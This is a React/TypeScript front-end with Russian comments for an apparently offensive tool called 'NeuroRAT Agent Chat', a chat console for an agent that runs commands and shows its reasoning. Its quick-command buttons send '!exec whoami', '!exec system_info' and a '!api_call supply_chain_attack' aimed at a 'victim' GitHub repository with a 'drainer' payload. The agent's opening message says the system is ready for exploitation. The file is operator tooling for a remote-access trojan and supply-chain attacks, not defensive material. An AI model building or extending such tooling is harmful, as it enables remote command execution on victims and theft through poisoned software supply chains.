import { useState, useRef, useEffect } from 'react';
import ReactMarkdown from 'react-markdown';
// import { useState } from 'react' // удаляю дублирующий импорт
// import reactLogo from './assets/react.svg'
// import viteLogo from '/vite.svg'
import './App.css'

// Типы для сообщений и reasoning
interface ReasoningSectionsProps {
  sections?: Record<string, string>;
  actions?: string[];
  actions_output?: string[];
  conclusion?: string;
}
interface Message {
  sender: string;
  text: string;
  time: string;
  response_type: string;
  reasoning?: ReasoningSectionsProps;
}

// Компонент секций reasoning/chain-of-thought
function ReasoningSections({ sections, actions, actions_output, conclusion }: ReasoningSectionsProps) {
  return (
    <div style={{ border: '1px solid #bbb', borderRadius: 6, padding: 12, margin: '8px 0', background: '#f8f8f8' }}>
      <div style={{ fontWeight: 700, color: '#0a0' }}>🧠 Chain-of-Thought</div>
      {Object.entries(sections || {}).map(([key, val]) => (
        val ? (
          <details key={key} open style={{ margin: '6px 0' }}>
            <summary style={{ fontWeight: 600, color: '#222' }}>{key}</summary>
            <div style={{ fontSize: 14, marginTop: 4 }}><ReactMarkdown>{val as string}</ReactMarkdown></div>
          </details>
        ) : null
      ))}
      {conclusion && <div style={{ marginTop: 8, color: '#222' }}><b>Вывод:</b> {conclusion}</div>}
      {actions && actions.length > 0 && (
        <div style={{ marginTop: 8 }}>
          <div style={{ fontWeight: 600 }}>Действия:</div>
          <ul>
            {actions.map((a: string, i: number) => <li key={i}>{a}</li>)}
          </ul>
        </div>
      )}
      {actions_output && actions_output.length > 0 && (
        <div style={{ marginTop: 8 }}>
          <div style={{ fontWeight: 600 }}>Результат команд:</div>
          {actions_output.map((out: string, i: number) => (
            <pre key={i} style={{ background: '#222', color: '#0a0', borderRadius: 4, padding: 8, margin: '4px 0', fontSize: 12, overflowX: 'auto' }}>{out}</pre>
          ))}
        </div>
      )}
    </div>
  );
}

// Панель истории чата с фильтром и экспортом
function ChatHistoryPanel({ agentId }: { agentId: string }) {
  const [history, setHistory] = useState<{ sender: string; content: string; timestamp: number }[]>([]);
  const [search, setSearch] = useState('');
  const [sender, setSender] = useState('');
  const [loading, setLoading] = useState(false);
  const fetchHistory = async () => {
    setLoading(true);
    let url = `/api/agent/${agentId}/chat/history?`;
    if (search) url += `search=${encodeURIComponent(search)}&`;
    if (sender) url += `sender=${encodeURIComponent(sender)}&`;
    const resp = await fetch(url);
    setHistory(await resp.json());
    setLoading(false);
  };
  useEffect(() => { fetchHistory(); }, [search, sender]);
  const exportHistory = () => {
    window.open(`/api/agent/${agentId}/chat/history?download=true`, '_blank');
  };
  return (
    <div style={{ border: '1px solid #bbb', borderRadius: 6, padding: 10, marginBottom: 12, background: '#fff' }}>
      <div style={{ display: 'flex', gap: 8, marginBottom: 8 }}>
        <input style={{ flex: 1, padding: 4 }} placeholder="Поиск..." value={search} onChange={e => setSearch(e.target.value)} />
        <select style={{ padding: 4 }} value={sender} onChange={e => setSender(e.target.value)}>
          <option value="">Все</option>
          <option value="user">user</option>
          <option value="agent">agent</option>
          <option value="reasoning">reasoning</option>
        </select>
        <button style={{ padding: '4px 10px', background: '#0a0', color: '#fff', border: 'none', borderRadius: 4 }} onClick={exportHistory}>Выгрузить</button>
      </div>
      {loading ? <div>Загрузка...</div> : (
        <div style={{ maxHeight: 120, overflowY: 'auto', fontSize: 13 }}>
          {history.map((msg, i) => (
            <div key={i} style={{ borderBottom: '1px solid #eee', paddingBottom: 4, marginBottom: 4 }}>
              <span style={{ color: '#0a0' }}>[{msg.sender}]</span> <span style={{ color: '#888' }}>{new Date((msg.timestamp||0)*1000).toLocaleTimeString()}</span>
              <div>{typeof msg.content === 'string' ? msg.content : JSON.stringify(msg.content)}</div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// Сообщение чата
function ChatMessage({ msg }: { msg: Message }) {
  let color = '#111';
  if (msg.sender === 'agent') color = '#0a0';
  if (msg.sender === 'user') color = '#0070f3';
  if (msg.response_type === 'reasoning') color = '#b8860b';
  return (
    <div style={{ margin: '8px 0', padding: 8, borderRadius: 6, background: '#f4f4f4' }}>
      <div style={{ fontWeight: 600, color }}>{msg.sender} <span style={{ fontWeight: 400, color: '#888', fontSize: 12 }}>({msg.time})</span></div>
      {msg.response_type === 'reasoning' && msg.reasoning ? (
        <ReasoningSections {...msg.reasoning} />
      ) : (
        <div style={{ marginTop: 4 }}><ReactMarkdown>{msg.text}</ReactMarkdown></div>
      )}
    </div>
  );
}

// Кнопки быстрых команд
function CommandButtons({ onCommand }: { onCommand: (cmd: string) => void }) {
  const cmds = [
    '!exec whoami', '!exec system_info', '!api_call supply_chain_attack {"target":"github.com/victim/repo","payload":"drainer"}', '!reasoning'
  ];
  return (
    <div style={{ display: 'flex', gap: 8, marginBottom: 8 }}>
      {cmds.map(cmd => (
        <button key={cmd} style={{ background: '#eee', color: '#111', border: '1px solid #bbb', borderRadius: 4, padding: '4px 10px' }} onClick={() => onCommand(cmd)}>{cmd}</button>
      ))}
    </div>
  );
}

// Drag&Drop файлов (заглушка)
function FileDrop() {
  return (
    <div className="border-2 border-dashed border-green-700 rounded p-4 text-center text-green-400 mb-2 cursor-pointer">
      Перетащите файл сюда для загрузки (скоро)
    </div>
  );
}

// Основной компонент чата
function App() {
  const [messages, setMessages] = useState<Message[]>([
    { sender: 'agent', text: 'Система готова к эксплуатации. Ожидаю команды.', time: '08:14', response_type: 'Agent' },
    { sender: 'user', text: 'привет', time: '08:14', response_type: 'user' },
    { sender: 'agent', text: 'Чё надо?', time: '08:14', response_type: 'Agent' },
  ]);
  const [input, setInput] = useState('');
  const chatRef = useRef<HTMLDivElement>(null);
  const agentId = '5f6ecd4d'; // TODO: динамически

  useEffect(() => {
    chatRef.current?.scrollTo(0, chatRef.current.scrollHeight);
  }, [messages]);

  const sendMessage = async (text: string) => {
    if (!text.trim()) return;
    const time = new Date().toLocaleTimeString().slice(0,5);
    setMessages(msgs => [...msgs, { sender: 'user', text, time, response_type: 'user' }]);
    setInput('');
    try {
      const resp = await fetch(`/api/agent/${agentId}/chat`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: text, autonomous_mode: false })
      });
      const data = await resp.json();
      if (data.response_type === 'reasoning') {
        setMessages(msgs => [...msgs, {
          sender: 'agent',
          text: '',
          time: new Date().toLocaleTimeString().slice(0,5),
          response_type: 'reasoning',
          reasoning: data.response
        }]);
      } else {
        setMessages(msgs => [...msgs, { sender: 'agent', text: data.response || '(нет ответа)', time: new Date().toLocaleTimeString().slice(0,5), response_type: data.response_type }]);
      }
    } catch {
      setMessages(msgs => [...msgs, { sender: 'agent', text: 'Ошибка связи с backend', time: new Date().toLocaleTimeString().slice(0,5), response_type: 'error' }]);
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: '#fff', color: '#111', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: 24 }}>
      <div style={{ width: '100%', maxWidth: 700, background: '#fafafa', borderRadius: 8, boxShadow: '0 2px 8px #0001', padding: 24, display: 'flex', flexDirection: 'column', minHeight: 600 }}>
        <h2 style={{ fontWeight: 700, fontSize: 22, marginBottom: 12 }}>NeuroRAT Agent Chat</h2>
        <CommandButtons onCommand={sendMessage} />
        <FileDrop />
        <ChatHistoryPanel agentId={agentId} />
        <div ref={chatRef} style={{ flex: 1, overflowY: 'auto', marginBottom: 12, background: '#fff', borderRadius: 6, padding: 8, border: '1px solid #eee' }}>
          {messages.map((msg, i) => <ChatMessage key={i} msg={msg} />)}
        </div>
        <form style={{ display: 'flex', gap: 8 }} onSubmit={e => { e.preventDefault(); sendMessage(input); }}>
          <input style={{ flex: 1, padding: 8, borderRadius: 4, border: '1px solid #bbb', fontSize: 15 }} placeholder="Введите команду..." value={input} onChange={e => setInput(e.target.value)} />
          <button type="submit" style={{ background: '#0a0', color: '#fff', border: 'none', borderRadius: 4, padding: '8px 18px', fontWeight: 600 }}>Отправить</button>
        </form>
      </div>
    </div>
  );
}

export default App
